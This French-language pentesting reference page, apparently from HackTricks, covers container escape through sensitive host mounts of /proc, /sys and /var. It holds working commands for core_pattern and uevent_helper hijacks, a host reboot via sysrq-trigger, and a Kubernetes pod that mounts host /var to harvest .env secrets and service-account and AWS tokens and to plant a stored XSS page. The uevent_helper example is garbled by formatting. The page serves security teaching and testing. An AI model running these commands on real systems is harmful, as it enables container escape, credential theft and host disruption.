# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

L'exposition de `/proc`, `/sys` et `/var` sans une isolation appropriée des espaces de noms introduit des risques de sécurité significatifs, y compris l'augmentation de la surface d'attaque et la divulgation d'informations. Ces répertoires contiennent des fichiers sensibles qui, s'ils sont mal configurés ou accessibles par un utilisateur non autorisé, peuvent conduire à une évasion de conteneur, à une modification de l'hôte ou fournir des informations aidant à d'autres attaques. Par exemple, le montage incorrect de `-v /proc:/host/proc` peut contourner la protection AppArmor en raison de sa nature basée sur le chemin, laissant `/host/proc` non protégé.

**Vous pouvez trouver plus de détails sur chaque vulnérabilité potentielle dans** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Vulnérabilités de procfs

### `/proc/sys`

Ce répertoire permet d'accéder à la modification des variables du noyau, généralement via `sysctl(2)`, et contient plusieurs sous-répertoires préoccupants :

#### **`/proc/sys/kernel/core_pattern`**

- Décrit dans [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Permet de définir un programme à exécuter lors de la génération d'un fichier core avec les 128 premiers octets comme arguments. Cela peut conduire à une exécution de code si le fichier commence par un pipe `|`.
- **Exemple de test et d'exploitation** :

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Tester l'accès en écriture
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Définir un gestionnaire personnalisé
sleep 5 && ./crash & # Déclencher le gestionnaire
```

#### **`/proc/sys/kernel/modprobe`**

- Détails dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Contient le chemin vers le chargeur de modules du noyau, invoqué pour charger des modules du noyau.
- **Exemple de vérification d'accès** :

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Vérifier l'accès à modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Référencé dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Un drapeau global qui contrôle si le noyau panique ou invoque le tueur OOM lorsqu'une condition OOM se produit.

#### **`/proc/sys/fs`**

- Selon [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contient des options et des informations sur le système de fichiers.
- L'accès en écriture peut permettre divers attaques par déni de service contre l'hôte.

#### **`/proc/sys/fs/binfmt_misc`**

- Permet d'enregistrer des interprètes pour des formats binaires non natifs en fonction de leur numéro magique.
- Peut conduire à une élévation de privilèges ou à un accès shell root si `/proc/sys/fs/binfmt_misc/register` est accessible en écriture.
- Exploit pertinent et explication :
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Tutoriel approfondi : [Lien vidéo](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Autres dans `/proc`

#### **`/proc/config.gz`**

- Peut révéler la configuration du noyau si `CONFIG_IKCONFIG_PROC` est activé.
- Utile pour les attaquants pour identifier les vulnérabilités dans le noyau en cours d'exécution.

#### **`/proc/sysrq-trigger`**

- Permet d'invoquer des commandes Sysrq, pouvant provoquer des redémarrages immédiats du système ou d'autres actions critiques.
- **Exemple de redémarrage de l'hôte** :

```bash
echo b > /proc/sysrq-trigger # Redémarre l'hôte
```

#### **`/proc/kmsg`**

- Expose les messages du tampon de noyau.
- Peut aider dans les exploits du noyau, les fuites d'adresses et fournir des informations sensibles sur le système.

#### **`/proc/kallsyms`**

- Liste les symboles exportés par le noyau et leurs adresses.
- Essentiel pour le développement d'exploits du noyau, en particulier pour surmonter KASLR.
- Les informations d'adresse sont restreintes avec `kptr_restrict` réglé sur `1` ou `2`.
- Détails dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interface avec le périphérique mémoire du noyau `/dev/mem`.
- Historiquement vulnérable aux attaques d'élévation de privilèges.
- Plus d'informations sur [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Représente la mémoire physique du système au format ELF core.
- La lecture peut divulguer le contenu de la mémoire du système hôte et d'autres conteneurs.
- La grande taille du fichier peut entraîner des problèmes de lecture ou des plantages de logiciels.
- Utilisation détaillée dans [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Interface alternative pour `/dev/kmem`, représentant la mémoire virtuelle du noyau.
- Permet la lecture et l'écriture, donc la modification directe de la mémoire du noyau.

#### **`/proc/mem`**

- Interface alternative pour `/dev/mem`, représentant la mémoire physique.
- Permet la lecture et l'écriture, la modification de toute la mémoire nécessite de résoudre les adresses virtuelles en adresses physiques.

#### **`/proc/sched_debug`**

- Renvoie des informations sur la planification des processus, contournant les protections de l'espace de noms PID.
- Expose les noms de processus, les ID et les identifiants de cgroup.

#### **`/proc/[pid]/mountinfo`**

- Fournit des informations sur les points de montage dans l'espace de noms de montage du processus.
- Expose l'emplacement du `rootfs` ou de l'image du conteneur.

### Vulnérabilités de `/sys`

#### **`/sys/kernel/uevent_helper`**

- Utilisé pour gérer les `uevents` des périphériques du noyau.
- Écrire dans `/sys/kernel/uevent_helper` peut exécuter des scripts arbitraires lors des déclenchements de `uevent`.
- **Exemple d'exploitation** : %%%bash

#### Crée une charge utile

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Trouve le chemin de l'hôte à partir du montage OverlayFS pour le conteneur

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Définit uevent_helper sur le gestionnaire malveillant

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Déclenche un uevent

echo change > /sys/class/mem/null/uevent

#### Lit la sortie

cat /output %%%

#### **`/sys/class/thermal`**

- Contrôle les paramètres de température, pouvant provoquer des attaques DoS ou des dommages physiques.

#### **`/sys/kernel/vmcoreinfo`**

- Fuit les adresses du noyau, compromettant potentiellement KASLR.

#### **`/sys/kernel/security`**

- Contient l'interface `securityfs`, permettant la configuration des modules de sécurité Linux comme AppArmor.
- L'accès pourrait permettre à un conteneur de désactiver son système MAC.

#### **`/sys/firmware/efi/vars` et `/sys/firmware/efi/efivars`**

- Expose des interfaces pour interagir avec les variables EFI dans NVRAM.
- Une mauvaise configuration ou une exploitation peut conduire à des ordinateurs portables brisés ou à des machines hôtes non amorçables.

#### **`/sys/kernel/debug`**

- `debugfs` offre une interface de débogage "sans règles" au noyau.
- Historique de problèmes de sécurité en raison de sa nature non restreinte.

### Vulnérabilités de `/var`

Le dossier **/var** de l'hôte contient des sockets d'exécution de conteneur et les systèmes de fichiers des conteneurs. Si ce dossier est monté à l'intérieur d'un conteneur, ce conteneur obtiendra un accès en lecture-écriture aux systèmes de fichiers d'autres conteneurs avec des privilèges root. Cela peut être abusé pour pivoter entre les conteneurs, provoquer un déni de service ou créer des portes dérobées dans d'autres conteneurs et applications qui s'exécutent en eux.

#### Kubernetes

Si un conteneur comme celui-ci est déployé avec Kubernetes :
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
À l'intérieur du conteneur **pod-mounts-var-folder** :
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
L'XSS a été réalisé :

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Notez que le conteneur NE nécessite PAS de redémarrage ou quoi que ce soit. Tous les changements effectués via le dossier monté **/var** seront appliqués instantanément.

Vous pouvez également remplacer des fichiers de configuration, des binaires, des services, des fichiers d'application et des profils shell pour obtenir un RCE automatique (ou semi-automatique).

##### Accès aux identifiants cloud

Le conteneur peut lire les jetons de service K8s ou les jetons webidentity AWS, ce qui permet au conteneur d'accéder de manière non autorisée à K8s ou au cloud :
```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```
#### Docker

L'exploitation dans Docker (ou dans les déploiements Docker Compose) est exactement la même, sauf que généralement les systèmes de fichiers des autres conteneurs sont disponibles sous un chemin de base différent :
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Les systèmes de fichiers se trouvent sous `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Remarque

Les chemins réels peuvent différer selon les configurations, c'est pourquoi votre meilleur choix est d'utiliser la commande **find** pour localiser les systèmes de fichiers des autres conteneurs et les jetons d'identité SA / web.

### Références

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
